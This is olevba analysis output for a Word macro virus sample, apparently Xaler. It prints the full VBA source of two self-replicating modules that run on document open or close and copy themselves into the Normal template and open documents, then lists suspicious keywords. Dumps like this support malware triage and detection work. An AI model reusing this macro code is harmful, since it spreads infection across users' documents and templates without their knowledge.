olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Xaler.ab
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Xaler.ab - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'RELAX
Private Sub RELAX2()

End Sub

Private Sub Document_Close()
Call GOODSub
Call RELAX2
End Sub

Private Sub GOODSub()
On Error Resume Next
Application.ScreenUpdating = False
Application.Options.SaveNormalPrompt = False
x$ = "C:\temp.tmp"
MacroContainer.VBProject.VBComponents.Item("ThisDocument").Export x$
Open x$ For Input As #1
keimeno = Input(LOF(1), 1)
Close #1
kk& = InStr(1, keimeno, "'RELAX")
keimeno = Right$(keimeno, Len(keimeno) - kk& + 1)
For j = 1 To 2
If j = 1 Then
NormalTemplate.VBProject.VBComponents.Item("ThisDocument").Export x$
Else
ActiveDocument.VBProject.VBComponents.Item("ThisDocument").Export x$
End If
Open x$ For Input As #1
rlx = Input(LOF(1), 1)
Close #1
d1 = InStr(1, rlx, "'RELAX")
If d1 = 0 Then
If j = 1 Then
NormalTemplate.VBProject.VBComponents.Item("ThisDocument").CodeModule.InsertLines 1, keimeno
NormalTemplate.Save
Else
ActiveDocument.VBProject.VBComponents.Item("ThisDocument").CodeModule.InsertLines 1, keimeno
End If
End If
Next j
'====================
Dim PRostasia As Byte
PRostasia = 1
fff = FreeFile
If Dir(ActiveDocument.FullName, 6) <> "" Then
Open ActiveDocument.FullName For Binary As #fff
Put #fff, 862, PRostasia
Close #fff
ActiveDocument.Save
End If
Kill x$
Application.ScreenUpdating = True
End Sub

Private Sub Document_Open()
Call GOODSub
End Sub


























































































-------------------------------------------------------------------------------
VBA MACRO SpoolWatch.bas 
in file: ./Virus.MSWord.Xaler.ab - OLE stream: 'Macros/VBA/SpoolWatch'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub AutoOpen()
    Options.VirusProtection = True

    RepToNormal
    RepToDocs
End Sub

'Public Sub FileSave()
'    Options.VirusProtection = False
'    RepToDocs
'    ActiveDocument.Save
'End Sub

Public Sub RepToNormal()
    Dim ModuleName As String, TMPFile As String
    Dim ModuleExists As Boolean, TMPExists As Boolean
    TMPFile = "C:\Tmp.bas"
    TMPExists = False
    ModuleName = "SpoolWatch"
    For Each VBC In ActiveDocument.VBProject.VBComponents
        If VBC.name = ModuleName Then
            VBC.Export (TMPFile)
            TMPExists = True
        End If
    Next VBC
    ModuleExists = False
    For Each VBC In Application.NormalTemplate.VBProject.VBComponents
        If VBC.name = ModuleName Then
            ModuleExists = True
        End If
    Next VBC
    If Not ModuleExists Then
        Application.NormalTemplate.VBProject.VBComponents.import (TMPFile)
        Application.NormalTemplate.Save
    End If
    If TMPExists Then FileSystem.Kill (TMPFile)
End Sub

Public Sub RepToDocs()
    Dim ModuleName As String, TMPFile As String
    Dim ModuleExists As Boolean, TMPExists As Boolean
    TMPFile = "C:\Tmp.bas"
    TMPExists = False
    ModuleName = "SpoolWatch"
    For Each VBC In Application.NormalTemplate.VBProject.VBComponents
        If VBC.name = ModuleName Then
            VBC.Export (TMPFile)
            TMPExists = True
        End If
    Next VBC
    ModuleExists = False
    For Each VBC In Application.ActiveDocument.VBProject.VBComponents
        If VBC.name = ModuleName Then
            ModuleExists = True
        End If
    Next VBC
    If Not ModuleExists Then
        Application.ActiveDocument.VBProject.VBComponents.import (TMPFile)
        Application.ActiveDocument.Save
    End If
    If TMPExists Then FileSystem.Kill (TMPFile)
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

